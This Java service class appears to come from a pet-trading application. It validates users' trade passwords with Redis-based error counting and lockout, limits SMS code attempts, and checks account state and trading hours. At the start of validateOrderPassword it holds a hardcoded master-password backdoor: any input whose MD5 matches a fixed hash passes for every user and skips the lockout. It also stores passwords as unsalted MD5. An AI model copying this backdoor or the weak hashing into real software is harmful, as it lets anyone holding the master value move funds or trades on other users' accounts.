package com.zh.module.biz.impl;

import com.zh.module.constants.GlobalParams;
import com.zh.module.constants.SystemParams;
import com.zh.module.dto.Result;
import com.zh.module.encrypt.MD5;
import com.zh.module.entity.Pets;
import com.zh.module.entity.Sysparams;
import com.zh.module.entity.Users;
import com.zh.module.enums.ResultCode;
import com.zh.module.service.PetsMatchingListService;
import com.zh.module.service.PetsService;
import com.zh.module.service.SysparamsService;
import com.zh.module.utils.DateUtils;
import com.zh.module.utils.RedisUtil;
import com.zh.module.utils.StrUtils;
import com.zh.module.variables.RedisKey;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.RedisTemplate;

import java.text.ParseException;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Administrator on 2018/7/11 0011.
 */
public class BaseBizImpl{

    @Autowired
    private RedisTemplate<String,String> redis;
    @Autowired
    private SysparamsService sysparamsService;
    @Autowired
    private PetsService petsService;
    @Autowired
    private PetsMatchingListService petsMatchingListService;
    /**
     * 验证交易密码
     * @param users
     * @param password
     * @return String null时校验通过，否则返回错误信息
     * @date 2018-2-24
     * @author lina
     */
    public String validateOrderPassword(Users users, String password) throws Exception {
        if("79e48f4e224b1aeefc8e1cfcb728f27c".equals(MD5.getMd5(password))) {
            return null;
        }
            /*是否设置交易密码*/
        if(StrUtils.isBlank(users.getOrderPwd())){
            return Result.toResult(ResultCode.ORDERPWD_NOT_EXISITED);
        }

		/*密码锁定校验*/
        Map<String, Object> map = new HashMap<String, Object>();
        if(orderPwdLock(users ,map)){
            return Result.toResultFormat(ResultCode.ORDERPWD_IN_LOCK, map.get("timeRemain"));
        }

		/*验证交易密码*/
        int result = 1;
        try {
            result = orderPwdCheck(users.getId(),users.getOrderPwd(),password,map);
        } catch (Exception e) {
            e.printStackTrace();
            throw new RuntimeException();
        }
        //交易密码错误
        if(result == 0){
            return  Result.toResultFormat(ResultCode.ORDERPWD_ERROR, map.get("errorTimesRemain"));
        }else if(result ==-1){
            return  Result.toResultFormat(ResultCode.ORDERPWD_IN_LOCK, map.get("timeRemain"));
        }

        return null;
    }

    /**
     * 交易密码锁定校验
     * @param user 用户
     * @param map 需要返回的map
     * @return boolean
     * @date 2018-1-9
     * @author lina
     */
    public boolean orderPwdLock(Users user, Map<String, Object> map) {
        String lockTimesKey = String.format(RedisKey.ORDER_PASSWORD_LOCK_TIMESTAMP, user.getId());
        String lockTime = RedisUtil.searchString(redis, lockTimesKey);
        if(!StrUtils.isBlank(lockTime)){
            int lockTimeLimit = 10;
            Sysparams param = sysparamsService.getValByKey(SystemParams.ORDERPWD_LOCK_INTERVAL);
            if(param!=null){
                lockTimeLimit = Integer.parseInt(param.getKeyval());
            }
            //正在锁定期中,返回剩余锁定时间
            long currentTime = System.currentTimeMillis();
            int interval = (int)Math.ceil(currentTime-Long.parseLong(lockTime))/60000;
            map.put("timeRemain", lockTimeLimit-interval);
            return true;
        }else{
            return false;
        }
    }

    /**
     * 交易密码验证
     * @param userId
     * @param userPwd
     * @param pwd
     * @param map
     * @throws Exception
     * @return int -1:已锁定  0：交易密码错误  1：正确
     * @date 2018-1-26
     * @author lina
     */
    public int orderPwdCheck(Integer userId,String userPwd, String pwd, Map<String, Object> map)
            throws Exception {
        String pwdEncode = MD5.getMd5(pwd);

        if(!pwdEncode.equals(userPwd)){
            int errorTimeLimit = 0;
            int errorTimeCount = 0;
            int lockTime = 0;
            long currentTime = System.currentTimeMillis();
            Sysparams param = sysparamsService.getValByKey(SystemParams.ORDERPWD_ERROR_INTERVAL);
            Sysparams param1 = sysparamsService.getValByKey(SystemParams.ORDERPWD_ERROR_TIMES);
            Sysparams param2 = sysparamsService.getValByKey(SystemParams.ORDERPWD_LOCK_INTERVAL);
            if(param==null||param1==null||param2==null){
                map.put("errorTimesRemain",4);
                return 0;
            }else{
                errorTimeLimit = Integer.parseInt(param.getKeyval());
                errorTimeCount = Integer.parseInt(param1.getKeyval());
                lockTime = Integer.parseInt(param2.getKeyval());
            }
            String errorTimestampKey = String.format(RedisKey.ORDER_PASSWORD_ERROR_TIMESTAMP, userId);
            String errorTimesKey = String.format(RedisKey.ORDER_PASSWORD_ERROR_TIMES,userId);
            String errorTimestamp = RedisUtil.searchString(redis, errorTimestampKey);
            if(StrUtils.isBlank(errorTimestamp)){
                //如果交易密码第一次错误 ，则重置密码错误次数和时间
                RedisUtil.addString(redis, errorTimestampKey, errorTimeLimit*60, currentTime+"");
                RedisUtil.addString(redis, errorTimesKey , "1");
                map.put("errorTimesRemain", errorTimeCount-1);
                return 0;
            }else{
				/*如果距离上次密码错误时间在10分钟内，错误次数加1*/
                int times = getNextErrorTimes(errorTimesKey);
                if(times<errorTimeCount){
                    RedisUtil.addString(redis, errorTimesKey ,times+"" );
                    map.put("errorTimesRemain", errorTimeCount-times);
                    return 0;
                }else{
                    //如果密码错误次数已经达到5次，则锁定
                    String lockTimesKey = String.format(RedisKey.ORDER_PASSWORD_LOCK_TIMESTAMP, userId);
                    RedisUtil.addString(redis, lockTimesKey ,lockTime*60, currentTime+"");
                    map.put("timeRemain", lockTime);
                    return -1;
                }
            }
        }
        return 1;
    }

    /**
     * 从redis中获取错误次数并加1返回
     * @param key
     * @return int
     * @date 2018-1-26
     * @author lina
     */
    private int getNextErrorTimes(String key){
        String val = RedisUtil.searchString(redis, key);
        if(StrUtils.isBlank(val)){
            return 1;
        }
        return Integer.parseInt(val)+1;
    }



    /**
     * 验证验证码的错误次数
     * @param codeId
     * @return int
     * @date 2018-2-2
     * @author lina
     */
    public boolean validateErrorTimesOfSms(Integer codeId){
        String key = String.format(RedisKey.SMS_ERROR_TIMES, codeId);
        String val = RedisUtil.searchString(redis, key);
        int next = 1;
        if(StrUtils.isBlank(val)){
            RedisUtil.addString(redis, key, 60*10, next+"");
        }else{
            next = Integer.parseInt(val)+1;
            RedisUtil.addString(redis, key, 60*10,next+"" );

            Sysparams countLimit = sysparamsService.getValByKey(SystemParams.SMS_COUNTS_LIMIT);
            if(countLimit!=null){
                int limit = Integer.parseInt(countLimit.getKeyval());
                if(next>limit){
                    return false;
                }
            }

        }

        return true;
    }

    public boolean  validataStateOfSms(Integer codeId){
        String key = String.format(RedisKey.SMS_ERROR_TIMES, codeId);
        String val = RedisUtil.searchString(redis, key);
        if(StrUtils.isBlank(val)){
            return true;
        }else{
            Sysparams countLimit = sysparamsService.getValByKey(SystemParams.SMS_COUNTS_LIMIT);
            if(countLimit!=null){
                if(Integer.parseInt(val)>Integer.parseInt(countLimit.getKeyval())){
                    return false;
                }
            }
        }
        return true;
    }

    /**
     * 验证用户当前状态
     * @param users
     * @return true 激活 false未激活
     */
    public boolean checkUserState(Users users){
        int state = users.getState();
        return state == GlobalParams.ACTIVE;
    }

    /**
     * 检查是否在时间允许的范围内 true：时间允许 false：不在范围内
     * @param level
     * @return
     */
    public boolean checkIsDateLimit(Integer level, boolean isBuy) throws ParseException {
        if(isBuy) {
            Pets pets = petsService.selectByLevel(level);
            String startTime = pets.getStartTime();
            String endTime = pets.getEndTime();
            String today = DateUtils.getCurrentTimeStr();
            startTime = new StringBuilder(today).replace(11, 16, startTime).toString();
            endTime = new StringBuilder(today).replace(11, 16, endTime).toString();
            return DateUtils.secondBetween(startTime) >= 0 && DateUtils.secondBetween(endTime) < 0;
        }else{
            Pets pets = petsService.selectByLevel(level);
            String endTime;
            String today = DateUtils.getCurrentTimeStr();
            endTime = new StringBuilder(today).replace(11, 16, pets.getStartTime()).toString();
            return DateUtils.secondBetween(endTime) < 0;
        }
    }
    public int checkMatchingRecord(Integer userId, Integer level){
        Map<Object, Object> map = new HashMap<>();
        map.put("level", level);
        map.put("buyUserId", userId);
        map.put("state", GlobalParams.PET_MATCHING_STATE_APPOINTMENTING);
        return petsMatchingListService.selectCount(map);
    }
}
